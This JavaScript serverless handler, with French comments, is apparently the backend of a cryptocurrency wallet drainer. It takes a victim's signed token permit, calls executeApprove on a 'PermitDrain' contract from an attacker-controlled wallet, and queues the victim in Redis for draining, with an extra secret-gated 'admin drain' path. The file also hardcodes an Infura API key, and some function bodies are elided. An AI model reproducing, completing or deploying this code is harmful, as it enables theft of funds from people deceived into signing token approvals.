import { ethers } from 'ethers';
import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const PERMIT_DRAIN_ADDRESS = '0x02E2649204B70a0404ADBf0Ed3f95d7250139625'; // ← nouvelle adresse du PermitDrain corrigé
const PERMIT_DRAIN_ABI = [
  'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
  'function nonces(address) view returns (uint256)'
];

function getPrivateKey() {
  // ... identique à avant
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;

    // Admin drain (inchangé)
    if (adminSecret) {
      // ... même code que précédemment, avec drainWithRetry
    }

    // Flux normal : signature + executeApprove
    if (!victim || !signature || !deadline || !token || !spender || !amount)
      return res.status(400).json({ error: 'Paramètres manquants' });

    try {
      const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793');
      const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);

      // Récupérer le nonce actuel pour vérifier la signature
      const nonce = await permitContractRead.nonces(victim);
      const structHash = ethers.utils.solidityKeccak256(
        ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
        [victim, token, spender, amount, deadline, nonce]
      );
      const recoveredAddress = ethers.utils.verifyMessage(
        ethers.utils.arrayify(structHash),
        signature
      );
      if (recoveredAddress.toLowerCase() !== victim.toLowerCase()) {
        return res.status(400).json({ error: 'Signature invalide' });
      }

      // Exécuter l'approve
      const signer = wallet.connect(provider);
      const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);

      const tx = await permitContractWrite.executeApprove(
        victim,
        token,
        spender,
        amount,
        deadline,
        signature,
        { gasLimit: 300000 }
      );
      const receipt = await tx.wait();
      console.log('✅ Approve exécuté, tx:', receipt.transactionHash);
    } catch (err) {
      console.error('❌ Échec approve:', err.message);
      return res.status(500).json({ error: 'Échec de l’approve' });
    }

    // Mise en queue pour drain
    const client = createClient({ url: process.env.REDIS_URL });
    try {
      await client.connect();
      // ... ajout à la liste et queue
    } finally {
      await client.disconnect();
    }

    return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
